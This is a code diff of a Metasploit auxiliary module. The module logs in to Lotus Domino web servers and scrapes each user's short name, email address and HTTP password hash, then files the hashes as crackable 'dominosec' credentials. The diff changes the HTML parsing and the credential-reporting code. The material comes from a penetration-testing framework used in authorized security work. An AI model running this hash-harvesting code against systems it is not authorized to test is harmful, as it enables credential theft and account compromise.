@@ -28,6 +28,10 @@ class MetasploitModule < Msf::Auxiliary
     ])
   end
 
+  def post_auth?
+    true
+  end
+
   def run_host(ip)
     user = datastore['NOTES_USER']
     pass = datastore['NOTES_PASS']
@@ -153,9 +157,10 @@ class MetasploitModule < Msf::Auxiliary
       }, 25)
 
       if res && res.body
-        short_name = res.body.scan(/<INPUT NAME=\"ShortName\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join
-        user_mail = res.body.scan(/<INPUT NAME=\"InternetAddress\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join
-        pass_hash = res.body.scan(/<INPUT NAME=\"\$?dspHTTPPassword\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join
+        doc = res.get_html_document
+        short_name =  doc.xpath('//input[@name="ShortName"]/@value').text
+        user_mail =  doc.xpath('//input[@name="InternetAddress"]/@value').text
+        pass_hash = doc.xpath('//input[@name="$dspHTTPPassword" or @name="dspHTTPPassword"]/@value').first&.text
 
         short_name = 'NULL' if short_name.to_s.strip.empty?
         user_mail = 'NULL' if user_mail.to_s.strip.empty?
@@ -169,17 +174,11 @@ class MetasploitModule < Msf::Auxiliary
             :port => rport,
             :name => (ssl ? 'https' : 'http')
           )
-          report_auth_info(
-            :host        => rhost,
-            :port        => rport,
-            :sname       => (ssl ? 'https' : 'http'),
-            :user        => short_name,
-            :pass        => pass_hash,
-            :ptype       => 'domino_hash',
-            :source_id   => domino_svc.id,
-            :source_type => 'service',
-            :proof       => "WEBAPP=\"Lotus Domino\", USER_MAIL=#{user_mail}, HASH=#{pass_hash}, VHOST=#{vhost}",
-            :active      => true
+
+          report_cred(
+            user: short_name,
+            password: pass_hash,
+            proof: "WEBAPP=\"Lotus Domino\", USER_MAIL=#{user_mail}, HASH=#{pass_hash}, VHOST=#{vhost}"
           )
         end
       end
@@ -187,5 +186,27 @@ class MetasploitModule < Msf::Auxiliary
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
     rescue ::Timeout::Error, ::Errno::EPIPE
     end
+  end
+
+  def report_cred(opts)
+
+    service_data = service_details.merge({workspace_id: myworkspace_id})
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :nonreplayable_hash,
+      jtr_format: 'dominosec'
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 end
